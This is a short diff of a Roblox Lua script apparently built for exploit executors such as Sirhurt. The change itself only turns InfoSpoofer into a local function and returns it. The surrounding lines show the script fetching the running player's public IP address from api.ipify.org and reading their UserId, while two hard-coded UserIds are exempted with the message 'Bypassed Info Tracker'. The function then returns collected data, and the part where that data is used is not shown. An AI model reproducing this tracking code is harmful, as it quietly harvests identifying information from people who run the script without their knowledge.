@@ -3,7 +3,7 @@ local ExecutorUsing = is_sirhurt_closure and "Sirhurt" or pebc_execute and "Prot
 local HttpService = game:GetService("HttpService")
 local Ip = tostring(game:HttpGet("https://api.ipify.org", true))
 local UserId = game.Players.LocalPlayer.UserId
-function InfoSpoofer(Game)
+local InfoSpoofer = function(Game)
     if UserId == 860289947 or UserId == 446350986 then
         print("Bypassed Info Tracker")
     else
@@ -56,3 +56,4 @@ function InfoSpoofer(Game)
         return Data
     end
 end
+return InfoSpoofer
